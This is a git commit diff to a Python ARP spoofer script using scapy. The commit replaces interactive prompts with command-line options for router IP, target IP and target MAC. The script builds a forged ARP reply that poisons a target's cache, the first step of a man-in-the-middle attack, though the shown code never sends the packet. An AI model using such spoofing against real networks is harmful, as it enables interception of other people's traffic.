9db090b502f85f75d9a71f484d32b7dda63e22a5
RockBlet <velyakove31@gmail.com>
2022-12-16 21:21:27 +0300

    add optparse, get arguments function

--- Moon/arp_spoofer.py
+++ Moon/arp_spoofer.py
@@ -1,7 +1,22 @@
 import scapy.all as scapy
-"""    Test Version     """
-target_mac = str(input("target_mac >>> "))
-target_ip = str(input("target_ip >>> "))
-route_ip = str(input("route_ip >>> "))
+import optparse
+
+
+def get_arguments():
+
+    parser = optparse.OptionParser()
+    parser.add_option("-r", "--route", dest="route_ip", help="router ip address")
+    parser.add_option("-t", "--target_ip)", dest="target_ip", help="target ip address")
+    parser.add_option("-m", "--target_mac", dest="target_mac", help="target mac address")
+    (options, arguments) = parser.parse_args()
+
+    return options
+
+
+options = get_arguments()
+target_ip = options.target_ip
+route_ip = options.route_ip
+target_mac = options.target_mac
 
 packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=route_ip)
+
